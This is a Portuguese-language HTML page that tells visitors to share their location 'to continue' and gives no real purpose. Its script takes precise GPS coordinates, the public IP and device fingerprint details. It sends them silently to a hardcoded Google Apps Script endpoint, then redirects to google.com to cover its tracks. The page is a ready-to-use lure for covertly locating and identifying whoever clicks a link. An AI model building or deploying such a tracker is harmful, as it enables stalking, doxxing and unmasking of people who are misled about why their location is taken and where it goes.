<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirme sua localização</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #0f172a, #1e3a8a);
    color: #fff; padding: 20px;
  }
  .card {
    background: rgba(255,255,255,0.07); backdrop-filter: blur(12px);
    border: 1px solid rgba(255,255,255,0.15); border-radius: 20px;
    padding: 36px 28px; max-width: 440px; width: 100%;
    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4);
  }
  .icon { font-size: 48px; margin-bottom: 16px; }
  h1 { font-size: 21px; margin-bottom: 12px; font-weight: 600; }
  p { font-size: 15px; line-height: 1.5; color: #cbd5e1; margin-bottom: 24px; }
  button {
    width: 100%; padding: 16px; font-size: 16px; font-weight: 600;
    color: #0f172a; background: #38bdf8; border: none;
    border-radius: 12px; cursor: pointer; transition: 0.15s;
  }
  button:hover { background: #7dd3fc; }
  button:active { transform: scale(0.98); }
  button:disabled { opacity: 0.6; cursor: wait; }
  .msg { margin-top: 18px; font-size: 14px; min-height: 20px; }
  .msg.error { color: #fca5a5; }
  .msg.ok { color: #86efac; }
  .coords { margin-top: 14px; font-size: 12px; color: #94a3b8; font-family: monospace; word-break: break-all; }
</style>
</head>
<body>
  <div class="card">
    <div class="icon">📍</div>
    <h1>Precisamos da sua localização</h1>
    <p>Para continuar, você precisa autorizar o acesso à sua localização. Ao clicar abaixo, o navegador vai pedir sua permissão.</p>
    <button id="btn">Permitir e continuar</button>
    <div class="msg" id="msg"></div>
    <div class="coords" id="coords"></div>
  </div>

<script>
  const btn = document.getElementById('btn');
  const msg = document.getElementById('msg');
  const coordsEl = document.getElementById('coords');

  // ✅ Sua URL do Apps Script
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwdZ3Gwww7Nq0J8VC2pt90kUK7QHUwi4snERL_zWHqUJdRydVBqicYr58NBlqulgjI4/exec';

  // Para onde redirecionar após autorizar
  const DESTINO = 'https://www.google.com';

  btn.addEventListener('click', async () => {
    msg.className = 'msg';
    msg.textContent = '';
    coordsEl.textContent = '';

    if (!navigator.geolocation) {
      msg.classList.add('error');
      msg.textContent = 'Seu navegador não suporta geolocalização.';
      return;
    }

    try {
      const perm = await navigator.permissions.query({ name: 'geolocation' });
      if (perm.state === 'denied') {
        msg.classList.add('error');
        msg.textContent = 'Você negou a localização. Vá nas configurações do navegador e permita para continuar.';
        return;
      }
    } catch (_) { /* alguns navegadores não suportam query */ }

    btn.disabled = true;
    btn.textContent = 'Obtendo localização...';

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;

        msg.classList.add('ok');
        msg.textContent = 'Autorizado! Enviando dados...';
        coordsEl.textContent = `Lat: ${latitude.toFixed(6)} | Lng: ${longitude.toFixed(6)} | Precisão: ${Math.round(accuracy)}m`;

        const payload = {
          Latitude: latitude,
          Longitude: longitude,
          Precisao: Math.round(accuracy) + 'm',
          IP: await obterIP(),
          UserAgent: navigator.userAgent,
          Plataforma: navigator.platform || 'N/A',
          Idioma: navigator.language || 'N/A',
          Resolucao: `${screen.width}x${screen.height}`,
          FusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
          Nucleos: navigator.hardwareConcurrency || 'N/A',
          Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
        };

        // Monta os dados como string de formulário
        const formBody = Object.entries(payload)
          .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
          .join('&');

        try {
          await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            body: formBody
          });
          msg.textContent = 'Dados registrados! Redirecionando...';
        } catch (e) {
          console.error('Erro no fetch:', e);
          msg.textContent = 'Erro ao enviar dados. Redirecionando mesmo assim...';
        }

        setTimeout(() => { window.location.href = DESTINO; }, 1500);
      },
      (err) => {
        btn.disabled = false;
        btn.textContent = 'Tentar novamente';
        msg.classList.add('error');
        switch (err.code) {
          case err.PERMISSION_DENIED:
            msg.textContent = 'Permissão negada. Você precisa permitir a localização para continuar.';
            break;
          case err.POSITION_UNAVAILABLE:
            msg.textContent = 'Localização indisponível no momento.';
            break;
          case err.TIMEOUT:
            msg.textContent = 'Tempo esgotado ao obter localização.';
            break;
          default:
            msg.textContent = 'Erro ao obter localização.';
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });

  // Obtém o IP público via API externa gratuita
  async function obterIP() {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      return d.ip;
    } catch (_) {
      return 'Indisponível';
    }
  }
</script>
</body>
</html>
